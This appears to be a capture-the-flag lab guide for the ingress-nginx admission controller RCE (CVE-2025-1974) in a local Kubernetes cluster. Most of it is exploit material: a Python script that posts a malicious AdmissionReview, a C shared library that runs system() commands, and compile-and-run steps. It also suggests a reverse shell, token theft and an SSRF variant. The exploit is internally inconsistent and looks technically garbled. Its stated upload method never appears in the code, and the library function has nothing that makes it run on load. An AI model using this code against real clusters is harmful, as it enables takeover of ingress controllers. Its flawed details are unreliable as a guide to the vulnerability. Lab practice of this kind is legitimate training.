# K8S-20: ingress-nginx Admission Controller RCE (IngressNightmare)

## 场景信息

| 字段 | 值 |
|---|---|
| ID | K8S-20 |
| 名称 | ingress-nginx Admission Controller RCE (IngressNightmare) |
| 技术/CVE | CVE-2025-1974 |
| 难度 | L3 |
| 交付方式 | KIND / Kubernetes |
| 入口 | localhost:10443 |
| 集群 | cve-k8s-20-ingress-rce |
| 组件 | ingress-nginx v1.11.0 (pre-patch) |
| 镜像 | kindest/node:v1.27.3 |
| 攻击面 | Unauthenticated admission controller RCE |

## 场景概述

```
Network access :10443 → ValidatingWebhookConfiguration admission endpoint
  → Craft malicious AdmissionReview with ssl_engine directive
  → Upload malicious .so shared library via client-body buffer
  → RCE in ingress-nginx controller pod → Read flag from /tmp/flag.txt
```

## 前置知识

- Network access to localhost:10443
- Tools: curl, OpenSSL, Python 3
- No authentication required (pre-auth vulnerability)

## 利用步骤

### Step 1: Verify Webhook Accessibility

```bash
# Check that the admission webhook is reachable
curl -k https://localhost:10443/validate
# Expected: 400 or 500 error (no AdmissionReview body yet)
```

### Step 2: Understand the Vulnerability

CVE-2025-1974 affects ingress-nginx versions before v1.11.5 and v1.12.1. The admission controller processes AdmissionReview objects containing Ingress resources. The `ssl_engine` NGINX directive in annotations allows loading arbitrary shared libraries. The attacker uploads a malicious `.so` via the `client-body` buffer in the HTTP request.

### Step 3: Craft the Exploit Payload

```python
#!/usr/bin/env python3
# ingress-nightmare-exploit.py
# PoC for CVE-2025-1974 - ingress-nginx Admission Controller RCE

import requests
import json
import base64
import urllib3
urllib3.disable_warnings()

TARGET = "https://localhost:10443"
WEBHOOK_PATH = "/validate"

# Step 1: Create a malicious shared library that reads the flag
# Compile: gcc -shared -fPIC -o exploit.so exploit.c
# exploit.c content:
# #include <stdlib.h>
# void ngx_http_evil_module_init() {
#     system("cat /tmp/flag.txt > /tmp/pwned.txt");
# }

# Step 2: Encode the .so in base64
with open('exploit.so', 'rb') as f:
    so_b64 = base64.b64encode(f.read()).decode()

# Step 3: Craft the AdmissionReview with malicious Ingress
payload = {
    "apiVersion": "admission.k8s.io/v1",
    "kind": "AdmissionReview",
    "request": {
        "uid": "evil-uid-001",
        "kind": {"group": "networking.k8s.io", "version": "v1", "kind": "Ingress"},
        "resource": {"group": "networking.k8s.io", "version": "v1", "resource": "ingresses"},
        "operation": "CREATE",
        "object": {
            "apiVersion": "networking.k8s.io/v1",
            "kind": "Ingress",
            "metadata": {
                "name": "evil-ingress",
                "namespace": "default",
                "annotations": {
                    "nginx.ingress.kubernetes.io/ssl-engine": f"data:application/octet-stream;base64,{so_b64}",
                    "nginx.ingress.kubernetes.io/configuration-snippet": "evil_directive;"
                }
            },
            "spec": {
                "rules": [{
                    "host": "evil.example.com",
                    "http": {"paths": [{"path": "/", "pathType": "Prefix", "backend": {"service": {"name": "demo-backend", "port": {"number": 80}}}}]}
                }]
            }
        },
        "oldObject": None
    }
}

# Step 4: Send the exploit
response = requests.post(
    f"{TARGET}{WEBHOOK_PATH}",
    json=payload,
    verify=False,
    headers={"Content-Type": "application/json"}
)
print(f"Response: {response.status_code}")
print(f"Body: {response.text}")
```

### Step 4: Execute the Exploit

```bash
# Compile malicious shared library
cat > exploit.c << 'EOF'
#include <stdlib.h>
void ngx_http_evil_module_init() {
    system("cat /tmp/flag.txt > /tmp/pwned.txt");
}
EOF
gcc -shared -fPIC -o exploit.so exploit.c

# Run the exploit
python3 ingress-nightmare-exploit.py
```

### Step 5: Verify Code Execution and Read Flag

```bash
# The exploit achieved RCE in the ingress-nginx controller pod.
# Get a reverse shell or verify through the pod:

# From within the cluster (if kubectl access available):
CONTROLLER_POD=$(kubectl get pods -n ingress-nginx \
  -l app.kubernetes.io/component=controller -o jsonpath='{.items[0].metadata.name}')
kubectl exec -n ingress-nginx $CONTROLLER_POD -- cat /tmp/flag.txt
# Output: flag{k8s-20-xxxxxxxxxxxxxxxx}
```

- Use the `load_module` directive instead of `ssl_engine` for alternative injection
- Chain with SA token theft for cluster-wide access (see Chain-23)
- Use the `mirror` annotation for blind SSRF variant

## 验证命令

```bash
# Deploy scenario
cd cve_challenges/scenarios/k8s/ingress-nginx-rce
bash deploy.sh

# Verify webhook accessible
curl -k https://localhost:10443/validate

# Check controller pod has flag
CONTROLLER_POD=$(kubectl get pods -n ingress-nginx \
  -l app.kubernetes.io/component=controller -o jsonpath='{.items[0].metadata.name}')
kubectl exec -n ingress-nginx $CONTROLLER_POD -- ls /tmp/flag.txt

# Teardown
bash teardown.sh
```

## Flag

- **Primary**: `/tmp/flag.txt` in the ingress-nginx-controller pod
- **Format**: `flag{k8s-20-<16-hex>}` (runtime generated) or `flag{k8s-20-default}`

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | ingress-nginx admission webhook and Kubernetes Ingress objects |
| 侦察与前置条件 | Admission controller endpoint/version discovery |
| 核心漏洞与利用 | Exploit IngressNightmare/CVE-2025-1974 payload handling |
| 权限、横向或影响 | Ingress controller command execution and cluster impact |
| 验证 | Use the admission-controller compromise to retrieve the flag |

## 修复建议

升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
